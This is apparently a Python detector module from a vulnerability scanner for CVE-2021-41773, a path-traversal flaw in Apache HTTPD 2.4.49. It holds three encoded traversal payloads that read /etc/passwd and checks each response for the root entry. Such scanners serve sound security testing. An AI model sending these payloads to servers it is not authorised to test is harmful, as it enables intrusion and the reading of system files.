"""CVE-2021-41773 - Apache HTTPD 2.4.49 Path Traversal + optional RCE."""
from .base import CVEDetector, CVEResult


class Apache2449Traversal(CVEDetector):
    cve_id = "CVE-2021-41773"
    title = "Apache HTTPD 2.4.49 Path Traversal"
    severity = "critical"
    affected = "Apache HTTPD 2.4.49"
    tags = ["cve-2021-41773", "apache", "path-traversal", "rce-potential"]

    PATHS = [
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    ]

    def probe(self, base, baseline_body):
        for p in self.PATHS:
            status, body = self._get(base + p, timeout=6)
            if not body or len(body) < 30:
                continue
            if "root:x:0:0" in body and "root:x:0:0" not in baseline_body:
                return CVEResult(
                    vulnerable=True,
                    url=base + p,
                    evidence="root:x:0:0 reflected in response",
                    detail=f"Apache 2.4.49 path traversal reads /etc/passwd via {p}",
                )
        return None
